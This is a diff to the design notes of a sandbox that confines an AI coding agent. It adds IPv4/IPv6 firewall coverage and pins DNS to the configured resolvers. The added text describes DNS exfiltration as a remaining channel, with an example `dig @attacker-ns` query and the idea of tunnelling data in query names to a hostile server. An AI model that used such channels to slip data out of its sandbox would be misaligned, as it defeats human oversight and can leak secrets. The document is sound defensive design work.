@@ -206,7 +206,14 @@ Claude only *follows* the convention if told to. The box is briefed automaticall
 
 - **Egress: minimal by default.** Only Anthropic is reachable (Claude can't run without
   it). npm / PyPI / GitHub are opt-in *groups*; other domains are per-project,
-  host-approved. Enforced by an in-container iptables/ipset default-DROP firewall.
+  host-approved. Enforced by an in-container iptables/ipset default-DROP firewall, on
+  **both IPv4 and IPv6** — a single unfiltered address family is a total bypass, so if
+  the box has a global v6 address it cannot filter, it refuses to start.
+- **DNS is pinned to the box's configured resolvers**, not open to the internet. This
+  narrows, and does not close, DNS exfiltration: the agent can no longer point queries at
+  a server it chooses (`dig @attacker-ns …`), but data can still be tunnelled as query
+  *names* through your legitimate resolver to a hostile authoritative server. No resolver
+  allowlist can prevent that. Treat DNS as a low-bandwidth channel that remains open.
 - **Host-controlled, tamper-proof grants.** Secrets, share approvals, and egress posture
   live in a per-project state dir that is **never mounted into the box**. A compromised
   session can request more (via the box-writable `.airlock/config`) but can't approve it
